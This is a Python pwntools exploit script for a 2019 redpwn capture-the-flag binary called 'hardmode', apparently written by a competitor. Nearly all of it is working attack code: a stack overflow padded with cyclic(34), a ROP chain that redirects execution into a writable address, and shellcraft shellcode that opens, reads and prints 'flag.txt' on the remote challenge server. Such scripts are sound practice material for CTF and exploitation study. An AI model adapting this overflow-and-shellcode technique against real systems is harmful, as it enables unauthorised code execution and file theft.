#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('hardmode')

host = args.HOST or 'chall.2019.redpwn.net'
port = int(args.PORT or 4002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
_rcvu('\n')

rop = ROP(exe)
#rop.raw(0xdeadbeef)
rop.call(0x080483B0, [0x0804A100])
rop.call(0x0804A100)

payload = cyclic(34) + rop.chain()
_sndl(payload)

_sndl('exit')
_rcvu('\n')

payload = shellcraft.write(1, 0x0804867C, 10)
payload += shellcraft.read(0, 0x0804A200, 30) + shellcraft.open(0x0804A200, 0) + shellcraft.read(3, 0x0804A200, 100) + shellcraft.write(1, 0x0804A200, 100)
payload = asm(payload)
_sndl(payload)
_snd('flag.txt')

# so troll =)))))))))))))
# the flag is: "cat: flag.txt: No such file or directory"

io.interactive()
